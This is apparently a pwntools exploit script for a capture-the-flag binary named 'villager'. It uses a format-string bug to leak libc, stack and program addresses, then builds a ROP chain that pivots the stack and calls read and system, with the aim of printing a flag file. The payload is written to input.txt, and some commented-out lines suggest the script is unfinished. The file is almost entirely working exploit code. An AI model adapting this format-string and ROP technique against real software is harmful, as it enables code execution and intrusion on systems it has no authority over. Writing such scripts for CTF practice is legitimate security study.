#!/usr/bin/env python
# coding: utf-8
from pwn import *
from libformatstr import FormatStr

context(os="linux", arch="i386")

# first: address leak
# second: input "return addr" + "
# third: write ropgadget (input "cat /home/q23/flag.txt")
# forth: write buffer address and system address
# finally: write ropgadget

# cat /home/q23/flag.txt\x00 (23 bytes)


def main():
    conn = process("./villager")
    libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
    p = FormatStr(autosort=False)
    # libc = ELF("./libc.so.6")

    conn.recvuntil("What's your name?")

    # first payload
    payload = "%91$p %78$p %79$p"  # _IO_file_overflow+12, return_addr-4, main+65
    conn.sendline(payload)

    conn.recvuntil("\n")
    recv = conn.recvuntil("\n")
    tmp = recv.rstrip().split(" ")

    libc_leak = tmp[1]
    libc_base = int(libc_leak, 16) - 247 - 0x18540  # nm -D /lib/i386-linux-gnu/libc-2.23.so |grep __libc_start_main

    stack_eip_leak = tmp[2]
    stack_eip_addr = int(stack_eip_leak, 16) - 0x2c
    stack_read_addr = stack_eip_addr + 12  # 12 is index (because it is used 2 pops)
    stack_esp_addr = stack_eip_addr + 24
    esp_addr = stack_eip_addr - 0x120  # this is the place of input

    base_leak = tmp[3]
    base_addr = int(base_leak, 16) - 65 - 0x8b0  # 0x8b0 is offset of "main"
    pop_eax_ret = libc_base + 0x2406e
    xchg_eax_esp_ret = libc_base + 0x18ea7

    system_addr = libc_base + libc.symbols["system"]
    read_addr = libc_base + libc.symbols["read"]

    print "libc_base: " + str(hex(libc_base))
    print "base_addr: " + str(hex(base_addr))
    print "stack_eip_addr: " + str(hex(stack_eip_addr))
    print "system: " + str(hex(system_addr))

    conn.recvuntil("What's your name?")

    payload = p32(base_addr + 0x8f1)  # return addr
    # payload += p32(0x1)  # stdin
    payload += p32(0xdeadbeef)  # stdin
    payload += p32(base_addr + 0x1ec4)  # buffer
    # payload += p32(0x17)  # size
    payload += p32(0xdeadbeef)  # size

    # p[0xffffbb0c + 4] = 0x1 <- なぜかこの2行があると上手く動かない
    # p[0xffffbb0c + 12] = 0x17
    p[0xffffbc2c] = pop_eax_ret
    p[0xffffbc30] = 0xffffbb0c
    p[0xffffbc34] = xchg_eax_esp_ret
    p[0xffffbc38] = read_addr
    # p[0xffffbc44] = esp_addr
    payload += p.payload(11, start_len=16)  # 11 is (already printed(4byte)) + (place of buffer(7))

    # payload += p32(stack_eip_addr)
    # payload += p32(stack_read_addr)
    # payload += p32(stack_esp_addr)
    payload += "\x00"

    f = open("input.txt", "w")
    f.write(payload)
    f.close()


def get_index(ropgadget):
    index = int("0x" + str(hex(ropgadget))[-4:], 16)
    return index


def alignment(payload):
    if not len(payload) % 4 == 0:
        return "P" * abs(len(payload) % 4 - 4)
    else:
        return ""


if __name__ == "__main__":
    main()
